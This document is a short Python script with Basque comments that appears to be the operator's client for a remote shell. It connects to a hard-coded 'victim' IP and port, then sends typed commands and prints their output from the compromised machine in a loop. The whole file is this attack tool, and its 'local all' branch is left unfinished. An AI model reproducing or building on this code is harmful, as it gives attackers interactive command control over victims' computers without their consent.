import socket 
import time

class cliente(object):
    def __init__(self,ip_biktima,portua):
        self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.so.connect((ip_biktima,portua))
    
    def koneksioa(self):
        while True:
            recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
            url = str(recibido,encoding='utf-8')#ruta aktuala string modura pasako du
            while True:
                mezua  = input(url + ">")#ruta actuala erantzukizun belezela jarriko du gure erantzuna jaso harte
                if len(mezua) != 0:
                    break
            self.so.send(bytes(mezua,encoding = 'utf-8'))# guk idatzitako mezua bidaliko du 
            if mezua == "itxi": # buklea mozteko 
                break
            #funtzioak
            comand = mezua.split(" ")#honen bitartez gure mezua zatitzen dugu espazioaren bitartez
            if comand[0].lower() == "cd" and len(comand) > 1:#lenego zatia cd baldinbada eta bere lusehera 1 baina handiagoa
                erantzuna =  self.so.recv(4095)#cd bidalitako erantzuna jasoko du
                print(str(erantzuna,encoding = 'utf-8')) 
            else:
              luz = self.so.recv(4095)#datuaren luzhera jasoko du 
              self.so.send(bytes("ok",encoding = 'utf-8'))#datua ongi iritzidela adirezten diogu
              erantzuna = self.so.recv(int(luz))#erantzuna jasotzen dugu
              print(str(erantzuna,encoding = 'utf-8')) 
            if comand[0].lower() == "local" and len(comand) > 1 :
              if comand[1].lower() == "all":
                izen_a = []
                fitxa_a = []
              erantzuna =  self.so.recv(4095)#cd bidalitako erantzuna jasoko du
              print(str(erantzuna,encoding = 'utf-8')) 
              print("local")    
            #funtzioak
            self.so.send(bytes("ok",encoding = 'utf-8'))# mezua ongi iritxi dela adierazteko
        self.so.close()#koneksioa itxi 

cliente = cliente("192.168.0.10",9999)
cliente.koneksioa()


